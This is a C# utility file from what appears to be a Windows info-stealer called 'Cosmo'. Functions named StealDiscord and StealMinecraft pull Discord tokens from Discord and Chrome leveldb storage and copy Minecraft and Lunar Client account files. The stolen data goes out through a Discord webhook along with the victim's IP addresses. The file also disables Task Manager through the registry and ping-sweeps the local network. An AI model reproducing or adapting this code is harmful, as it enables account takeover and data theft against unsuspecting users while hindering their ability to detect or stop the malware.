using Discord;
using Discord.Webhook;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;

namespace Cosmo.Utils
{
    public static class Utils
    {
        public static bool DisableTaskMan()
        {
            try
            {
                Microsoft.Win32.RegistryKey HKCU = Microsoft.Win32.Registry.CurrentUser;
                Microsoft.Win32.RegistryKey key = HKCU.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                key.SetValue("DisableTaskMgr", false ? 0 : 1, Microsoft.Win32.RegistryValueKind.DWord);

                return true;
            }
            catch
            {
                return false;
            }
        }

        public static async Task<string> GetIPAsync()
        {
            String ip = "";

            var httpClient = new HttpClient();
            ip = await httpClient.GetStringAsync("https://api.ipify.org");

            return ip;
        }

        public static List<String> GetLocalIPs()
        {
            List<String> ips = new List<String>();

            String strHostName = string.Empty;
            IPHostEntry ipEntry = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress[] addr = ipEntry.AddressList;

            for (int i = 0; i < addr.Length; i++)
            {
                ips.Add(addr[i].ToString());
            }

            return ips;
        }

        public static void FireWebhook(String content, FileInfo? file = null)
        {
            DiscordWebhook hook = new DiscordWebhook();
            hook.Url = Global.Global.webhook;

            DiscordMessage message = new DiscordMessage();
            message.Content = content;
            message.Username = "Cosmo Instance : " + Global.Global.guid;

            if (file == null) { hook.Send(message); } else { hook.Send(message, file); }
            Thread.Sleep(2500);
        }

        public static String GetNetworkGatewayIP()
        {
            String ip = "";

            foreach (NetworkInterface f in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (f.OperationalStatus == OperationalStatus.Up)
                {
                    foreach (GatewayIPAddressInformation d in f.GetIPProperties().GatewayAddresses)
                    {
                        ip = d.Address.ToString();
                    }
                }
            }

            return ip;
        }

        public static List<String> GetNetworkIPs(String gateway)
        {
            string[] array = gateway.Split('.');
            List<String> ips = new List<String>();

            string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
            byte[] buffer = Encoding.ASCII.GetBytes(data);

            for (int i = 2; i <= 255; i++)
            {
                string ip = array[0] + "." + array[1] + "." + array[2] + "." + i;

                Ping pinger = new Ping();
                PingReply reply;
                reply = pinger.Send(ip, 200, buffer);

                if (reply.Status == IPStatus.Success)
                {
                    ips.Add(ip);
                }
            }

            return ips;

        }

        public static void StealMinecraft()
        {
            String userDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            try
            {
                FireWebhook("Minecraft Tokens : ", new FileInfo(userDirectory + "\\AppData\\Roaming\\.minecraft\\launcher_profiles.json"));
            }
            catch
            {
                FireWebhook("Minecraft Tokens unavailable");
            }
            try
            {
                FireWebhook("Lunarclient Tokens : ", new FileInfo(userDirectory + "\\.lunarclient\\settings\\game\\accounts.json"));
            }
            catch
            {
                FireWebhook("Lunarclient Tokens unavailable");
            }
        }

        public static bool dotldb(ref String stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".ldb");
                    }
                }
                return stringx.EndsWith(".ldb");
            }
            return false;
        }

        public static string tokenx(String stringx, bool boolx = false)
        {
            byte[] bytes = File.ReadAllBytes(stringx);
            String @string = Encoding.UTF8.GetString(bytes);
            String string1 = "";
            String string2 = @string;
            while (string2.Contains("oken"))
            {
                String[] array = IndexOf(string2).Split(new char[]
                {
                    '"'
                });
                string1 = array[0];
                string2 = String.Join("\"", array);
                if (boolx && string1.Length == 59)
                {
                    break;
                }
            }
            return string1;
        }

        public static String IndexOf(String stringx)
        {
            String[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<String> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return String.Join("\"", array);
        }

        public static bool dotlog(ref String stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".log");
                    }
                }
                return stringx.EndsWith(".log");
            }
            return false;
        }

        public static void StealDiscord()
        {
            String string1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
            if (!dotldb(ref string1) && !dotldb(ref string1)) { }
            System.Threading.Thread.Sleep(100);
            String string2 = tokenx(string1, string1.EndsWith(".log"));
            if (string2 == "")
            {
                string2 = "N/A";
            }
            String string3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
            if (!dotldb(ref string3) && !dotlog(ref string3)) { }
            System.Threading.Thread.Sleep(100);
            String string4 = tokenx(string3, string3.EndsWith(".log"));
            if (string4 == "")
            {
                string4 = "N/A";
            }

            FireWebhook("Discord token(s) : " + string2 + " : " + string4);
        }
    }
}
